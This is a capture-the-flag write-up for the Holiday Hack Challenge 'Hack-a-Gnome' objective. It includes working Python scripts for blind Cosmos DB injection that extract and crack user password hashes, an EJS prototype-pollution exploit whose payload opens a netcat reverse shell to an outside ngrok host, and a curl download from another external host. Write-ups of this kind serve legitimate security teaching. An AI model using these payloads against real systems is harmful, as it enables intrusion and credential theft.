+++
date = '2025-12-12T11:47:39+01:00'
draft = true
title = 'Hack-a-Gnome'
weight = 2
+++

![Chris Daves](/images/act3/chrisdavis-avatar.gif)

## Objective

| Difficulty | Description |
| ---------- | ----------- |
| 3/5 | Davis in the Data Center is fighting a gnome army—join the hack-a-gnome fun. |

## Chris Daves mission statement

> Hi, my name is Chris.
> 
> I like miniature war gaming and painting minis.
> 
> I enjoy open source projects and amateur robotics.
> 
> Hiking and kayaking are my favorite IRL activies.
> 
> I love single player video games with great stoylines.
> 
> ----
>
> Hey, I could really use another set of eyes on this gnome takeover situation.
> 
> Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!
> 
> But every system has weaknesses if you know where to look.
> 
> If these gnomes freeze the whole neighborhood, forget about hiking or kayaking—everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.
> 
> Ready to help me turn one of these rebellious bots against its own kind?

## Solution

### Getting access to the control panel

When opening the URL:

```
https://hhc25-smartgnomehack-prod.holidayhackchallenge.com
```

I am presented with the following landing page:

![First landing page](/images/act3/act3-hackagnome-6.png)

By inspecting the HTML source and the JavaScript loaded by the main page, I identified an interesting file:

```
https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js
```

Reviewing this file revealed the following backend endpoints used by the application:

| Endpoint                   | Description                                                                |
| -------------------------- | -------------------------------------------------------------------------- |
| `/register`                | Endpoint for registering a new user                                        |
| `/userAvailable?username=` | Endpoint used to check whether a username is available during registration |

Of these, `/userAvailable` is the only endpoint that accepts user-controlled input without authentication, making it a natural starting point.

---

### Identifying the database

To understand how the backend processes input, I attempted to provoke an error by submitting an unexpected character to the `userAvailable` endpoint:

```bash
https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username="
```

This resulted in the following error message:

```json
{"error":"An error occurred while checking username: Message: {\"errors\":[{\"severity\":\"Error\",\"location\":{\"start\":44,\"end\":45},\"code\":\"SC1012\",\"message\":\"Syntax error, invalid string literal token '\\\"'.\"}]}\r\nActivityId: fc87623e-4f9b-4d3d-9b18-f56fefa1b5d9, Microsoft.Azure.Documents.Common/2.14.0"}
```

The presence of `Microsoft.Azure.Documents.Common` in the error output indicates that the backend database is **Azure Cosmos DB (SQL API)**.

---

### Enumerating users

Based on the challenge hints, the next step was to enumerate users stored in the database. The endpoint returns a boolean value (`available: true` or `false`), which makes it well suited for brute-force enumeration.

I used **ffuf** with a list of common names:

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
-u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ \
-X GET -fr "true"
```

By filtering out responses containing `"true"`, I identified usernames that already exist in the database.

The following valid users were discovered:

* `bruce`
* `harold`

---

### Enumerating the database

At this stage, I knew the backend was Cosmos DB, but had no prior experience working with its query syntax. From reviewing examples online, Cosmos DB SQL queries typically follow this pattern:

```sql
SELECT * FROM p WHERE p.something = something
```

From this, I established the following workflow:

1. Identify the document alias (`p` in the example)
2. Identify which fields exist in the document (Cosmos DB is schemaless)
3. Determine whether credential material can be extracted

For this phase, I decided to leave ffuf and move to Python, as it allowed me to implement more controlled logic for blind enumeration.

---

### Cosmos DB enumeration using Python

The following Python script was used to interact with the `userAvailable` endpoint and perform boolean-based enumeration against Cosmos DB.

```python
import requests
import urllib.parse
import string
import sys
from pprint import pprint

#
# Helper function for injection
# 
def inject(base_url: str, payload: str) -> str:
    url = base_url + urllib.parse.quote_plus(payload)

    r = requests.get(url)
    
    return r.json()

#
# Map out prefix
#
def find_prefix(url, username):
    prefix_letter = None

    for prefix in string.ascii_letters:
        payload = f'{username}" AND IS_DEFINED({prefix}.username) --'
        result = inject(base_url, payload)

        if "error" in result.keys():
            continue

        prefix_letter = prefix
        break

    return prefix_letter

# 
# Find password field name
#
def find_password_field(url, username, prefix):
    fields = []
    with open("burp-parameter-names.txt", "r") as f:
        for line in f.readlines():
            needle = line.strip("\n")
            payload = f'{username}" AND IS_DEFINED({prefix}.{needle}) --'
            result = inject(url, payload)

            if "error" in result.keys():
                continue

            if result.get("available") is False:
                fields.append(needle)

        return fields

#
# Find digest
# 
def find_digest(base_url, prefix, candidate="", username=""):
    for c in string.ascii_lowercase + string.digits + "-":
        if c in [":"]:
            continue

        p = candidate + c
        
        payload = f'{username}" AND STARTSWITH({prefix}.digest, "{p}") --'
        result = inject(base_url, payload)

        print(payload)
        if result["available"] is False:
            print(p)
            find_digest(base_url, prefix, p, username)
            break

#
# Main logic
#
base_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username="
prefix = find_prefix(base_url, "harold")
fields = find_password_field(base_url, "harold", prefix)

print("Prefix is: {prefix}")
print("Document fields is: ")
print("\n*".join(fields))

find_digest(base_url, prefix, "", "harold")
find_digest(base_url, prefix, "", "bruce")
```

Running this script revealed that the document alias used in backend queries is `c`.

The following document fields were identified:

```bash
ID
Id
USERNAME
UserName
Username
digest
id
userName
username
```

There is no plaintext password field; however, a `digest` field is present and appears to store a password hash.

---

### Extracting and cracking password digests

Using the same script, I brute-forced the `digest` field for both users using the `STARTSWITH()` function to extract the value character by character.

This resulted in the following hashes:

| Username | Digest (MD5)                     | Decoded   |
| -------- | -------------------------------- | --------- |
| bruce    | d0a9ba00f80cbc56584ef245ffc56b9e | oatmeal12 |
| harold   | 07f456ae6a94cb68d740df548847f459 | oatmeal!! |

The digests were identified as MD5 hashes and cracked using **CrackStation**.

---

### Exploiting the control panel

After logging in using the recovered credentials, I am presented with the control panel landing page:

![Landing page](/images/act3/act3-hackagnome-1.png)

Inspecting the HTML and JavaScript revealed the following internal endpoints:

| Endpoint                | Description                                      |
| ----------------------- | ------------------------------------------------ |
| `/home`                 | Main page containing two iframes                 |
| `/stats`                | Smart Gnome Statistics panel                     |
| `/control`              | Gnome Control Interface                          |
| `/ctrlsignals?message=` | Backend endpoint for updating control parameters |

The `/ctrlsignals` endpoint is the only endpoint that accepts structured user input.

---

### Identifying the exploitable vector

Knowing from the challenge hints that prototype pollution was likely involved, I focused on the `/ctrlsignals` endpoint.

Submitting malformed input (a single `'`) caused a JSON parsing error:

```
SyntaxError: Unexpected token ' in JSON at position 0
```

The stack trace references Express.js and EJS, indicating that user-supplied JSON is later rendered in an EJS template.

---

### Confirming prototype pollution

To test for prototype pollution, I submitted the following payload:

```bash
https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={"action":"update","key":"__proto__","subkey":"toString","value":"a"}
```

After URL-encoding the payload and refreshing the page, the application began throwing global errors related to `Object.prototype`, confirming that `__proto__` pollution is possible.

---

### Weaponizing the vulnerability

At this point I switched to Python to automate the attack flow, as interacting via the browser became cumbersome.

The following script performs the complete exploitation chain:

1. Logs in to the control panel
2. Triggers a JSON parsing error
3. Pollutes `__proto__` with required flags (`debug`, `client`)
4. Injects a malicious `escapeFunction`
5. Triggers execution by loading `/stats`

```python
import requests
import json
import html
import urllib.parse
from bs4 import BeautifulSoup

#
# Login
# 
login_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/login?id=dfbd809f-8d6a-4500-87ba-c6e29b90f34c"
creds = { "username": "bruce", "password": "oatmeal12" }

s = requests.Session()
r = s.post(login_url, data=creds)

#
# Trigger JSON parse error
#
error_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message='"
payload_r = s.get(error_url)

soup = BeautifulSoup(payload_r.text, "html.parser")
raw_text = soup.pre.get_text() 
decoded_text = html.unescape(raw_text)

print(decoded_text)

#
# Staging
#
for subkey in ["debug", "client"]:
    payload = {
        "action": "update",
        "key": "__proto__",
        "subkey": subkey,
        "value": 1
    }

    payload_encoded = urllib.parse.quote_plus(json.dumps(payload))
    proto_url = f"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={payload_encoded}"
    s.get(proto_url)

#
# Weaponizing
#
payload = {
    "action": "update",
    "key": "__proto__",
    "subkey": "escapeFunction",
    "value": "JSON.stringify; process.mainModule.require('child_process').exec('nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000')"
}

payload_encoded = urllib.parse.quote_plus(json.dumps(payload))
proto_url = f"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={payload_encoded}"
s.get(proto_url)

#
# Trigger execution
#
stats_panel_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats"
s.get(stats_panel_url)
```

Note: The script outputs the various URLs for this to work. I simply had to copy and execute them in a browser in order to play the game. From here on the report reflects that.

---

### Operating the reverse shell

Once the payload was in place, it connected back through my infrastructure, resulting in an interactive shell:

![Call back](/images/act3/act3-hackagnome-2.png)

While exploring the container, the `canbus_client.py` script stood out:

![Canbus client](/images/act3/act3-hackagnome-3.png)

The script contains a `COMMAND_MAP`, but comments indicate the values are incorrect. The accompanying README confirms this:

![Landing page](/images/act3/act3-hackagnome-4.png)

---

### Enumerating CAN bus control codes

To identify the correct movement commands, I modified the existing Python script into a brute-force CAN bus scanner and uploaded it to the container:

```bash
curl -o cb.py https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py
```

The script was executed iteratively, narrowing the ID range based on observed robot movement. The final scan range was limited to `0x200–0x206`.

```python
#!/usr/bin/env python3
import time
import struct
import can

IFACE = "gcan0"

RPM_LEFT_ID  = 0x310
RPM_RIGHT_ID = 0x311

SCAN_START = 0x200
SCAN_END   = 0x206
...
```
---

### Final control mapping and solution

After testing, I identified the following CAN bus mappings:

| Button | Original ID | Correct ID |
| ------ | ----------- | ---------- |
| w      | 0x656       | 0x201      |
| a      | 0x658       | 0x203      |
| s      | 0x657       | 0x202      |
| d      | 0x659       | 0x204      |

After updating the script, I was able to navigate the robot through the maze and complete the objective:

```
python3 cb.py <direction>
```

![Final screen](/images/act3/act3-hackagnome-5.png)

## Chris Davis mission debrief

> Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.
>
> Time to turn this little rebel against its own manufacturing operation and shut them down for good!

## Hints 

For this objective I retrieved the followint hints:

| Hint | 
| ---- |
| Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message. |
| I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again). |
| There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it. |
| Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack. |
| Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages. |
| Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI. |

## Resources

This objective required extensive reading up on the whole `__proto__` attack vector. We found these resources of great value for our research:

* https://security.snyk.io/vuln/SNYK-JS-EJS-2803307
* https://blog.themikkel.dk/ddc-regionale-2025-writeup/
* https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/
* https://www.nodejs-security.com/blog/understanding-and-preventing-prototype-pollution-in-nodejs
* https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce
* https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325
* https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3
* https://ejs.co/#docs